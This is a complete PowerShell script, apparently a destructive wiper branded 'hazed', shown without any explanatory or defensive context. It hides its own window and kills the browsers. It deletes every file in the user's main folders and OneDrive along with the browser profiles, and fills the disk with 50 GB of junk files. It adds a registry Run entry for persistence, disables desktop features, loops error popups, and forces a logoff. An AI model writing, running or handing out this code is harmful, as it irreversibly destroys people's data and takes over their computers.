if ($host.Name -eq 'ConsoleHost' -and $MyInvocation.MyCommand.Path -and [Environment]::GetCommandLineArgs() -notcontains '--hidden') {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" --hidden"
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}


$null = [System.Console]::SetOut([System.IO.TextWriter]::Null)


[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")


$procesos = @("chrome", "msedge", "opera", "firefox")
foreach ($p in $procesos) {
    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 1


$userFolders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Music",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\Favorites",
    "$env:USERPROFILE\OneDrive"
)
foreach ($folder in $userFolders) {
    if (Test-Path $folder) {
        Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }
}


$browserPaths = @(
    "$env:APPDATA\Google\Chrome\User Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles",
    "$env:APPDATA\Opera Software\Opera Stable",
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
)
foreach ($browserPath in $browserPaths) {
    if (Test-Path $browserPath) {
        Remove-Item -Path $browserPath -Recurse -Force -ErrorAction SilentlyContinue
    }
}


$junkPath = "$env:TEMP\hazed_storage"
New-Item -ItemType Directory -Path $junkPath -Force | Out-Null
for ($i=1; $i -le 10; $i++) {
    $targetFile = "$junkPath\volume_$i.bak"
    fsutil file createnew $targetFile 5368709120 | Out-Null
}


$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "hazedSystemCore"
$part1 = "powershell.exe -WindowStyle Hidden -Command "
$part2 = "`"while (`$true) { Start-Process calc.exe; Start-Sleep -Seconds 3 }`""
Set-ItemProperty -Path $regPath -Name $regName -Value ($part1 + $part2) -Force -ErrorAction SilentlyContinue


$regExplorer = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (!(Test-Path $regExplorer)) { New-Item -Path $regExplorer -Force | Out-Null }
Set-ItemProperty -Path $regExplorer -Name "NoDesktop" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $regExplorer -Name "NoTrayContextMenu" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue


$popupScript = @"
[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
while (`$true) {
    [System.Windows.Forms.MessageBox]::Show('Your user profile has been hazed!', 'hazed owns you', 'OK', 'Error')
    Start-Sleep -Milliseconds 400
}
"@
$popupPath = "$env:TEMP\hazed_win_alert.ps1"
$popupScript | Out-File -FilePath $popupPath -Encoding ASCII
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File `"$popupPath`"" -WindowStyle Hidden


Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue


shutdown /l /f